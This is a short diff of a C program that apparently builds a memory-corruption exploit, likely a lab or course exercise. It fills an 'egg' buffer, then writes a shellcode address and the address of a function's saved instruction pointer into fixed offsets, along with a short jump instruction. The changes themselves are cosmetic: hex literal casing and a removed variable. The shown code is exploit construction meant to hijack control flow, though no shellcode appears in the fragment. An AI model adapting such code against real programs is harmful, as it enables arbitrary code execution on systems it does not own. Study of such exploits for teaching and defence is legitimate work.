@@ -21,13 +21,12 @@ int main(void)
   int i;
 
   shellcodeAddr = 0x08049C68; // address of buff
-  dummyVal = 0xffffffff;
-  jumpInstr = 0xffff06eb; // jump instr
-  fpAddr = 0xbffffa3c; // addr of eip for foo
+  jumpInstr = 0xFFFF06EB; // jump instr
+  fpAddr = 0xBFFFFA3C; // addr of eip for foo
 
   addrPtr = (long *) egg; 
   for (i = 0; i < EGG_SIZE; i += 4)
-    *(addrPtr++) = 0xffffffff;
+    *(addrPtr++) = 0xFFFFFFFF;
 
   memcpy(&egg[504], &shellcodeAddr, 4);
   memcpy(&egg[508], &fpAddr, 4);
